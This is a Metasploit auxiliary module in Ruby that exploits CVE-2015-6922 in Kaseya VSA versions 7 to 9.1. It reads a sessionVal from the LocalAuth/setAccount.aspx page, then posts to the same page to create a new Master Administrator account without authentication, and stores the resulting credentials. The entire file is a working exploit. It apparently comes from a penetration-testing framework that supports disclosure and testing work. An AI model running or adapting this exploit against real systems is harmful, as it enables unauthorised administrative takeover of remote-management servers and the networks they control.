##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Kaseya VSA Master Administrator Account Creation',
      'Description' => %q{
        This module abuses the setAccount page on Kaseya VSA between 7 and 9.1 to create a new
        Master Administrator account. Normally this page is only accessible via the localhost
        interface, but the application does nothing to prevent this apart from attempting to
        force a redirect. This module has been tested with Kaseya VSA v7.0.0.17, v8.0.0.10 and
        v9.0.0.3.
      },
      'Author' =>
        [
          'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability discovery and MSF module
        ],
      'License' => MSF_LICENSE,
      'References' =>
        [
          ['CVE', '2015-6922'],
          ['ZDI', '15-448'],
          ['URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/advisories/kaseya-vsa-vuln-2.txt'],
          ['URL', 'https://seclists.org/bugtraq/2015/Sep/132']
        ],
      'DisclosureDate' => 'Sep 23 2015'))

    register_options(
      [
        OptString.new('TARGETURI', [ true,  'The Kaseya VSA URI', '/']),
        OptString.new('KASEYA_USER', [true, 'The username for the new admin account', 'msf']),
        OptString.new('KASEYA_PASS', [true, 'The password for the new admin account', 'password']),
        OptString.new('EMAIL', [true, 'The email for the new admin account', 'msf@email.loc'])
      ])
  end


  def run
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'LocalAuth', 'setAccount.aspx'),
      'method' =>'GET',
    })

    if res && res.body && res.body.to_s =~ /ID="sessionVal" name="sessionVal" value='([0-9]*)'/
      session_val = $1
    else
      print_error("Failed to get sessionVal")
      return
    end

    print_status("Got sessionVal #{session_val}, creating Master Administrator account")

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'LocalAuth', 'setAccount.aspx'),
      'method' =>'POST',
      'vars_post' => {
        'sessionVal' => session_val,
        'adminName' => datastore['KASEYA_USER'],
        'NewPassword' => datastore['KASEYA_PASS'],
        'confirm' => datastore['KASEYA_PASS'],
        'adminEmail' => datastore['EMAIL'],
        'setAccount' => 'Create'
      }
    })

    unless res && res.code == 302 && res.body && res.body.to_s.include?('/vsapres/web20/core/login.asp')
      print_error("Master Administrator account creation failed")
      return
    end

    print_good("Master Administrator account with credentials #{datastore['KASEYA_USER']}:#{datastore['KASEYA_PASS']} created")

    connection_details = {
        module_fullname: self.fullname,
        username: datastore['KASEYA_USER'],
        private_data: datastore['KASEYA_PASS'],
        private_type: :password,
        workspace_id: myworkspace_id,
        access_level: 'Master Administrator',
        status: Metasploit::Model::Login::Status::UNTRIED
    }.merge(service_details)
    create_credential_and_login(connection_details)
  end
end
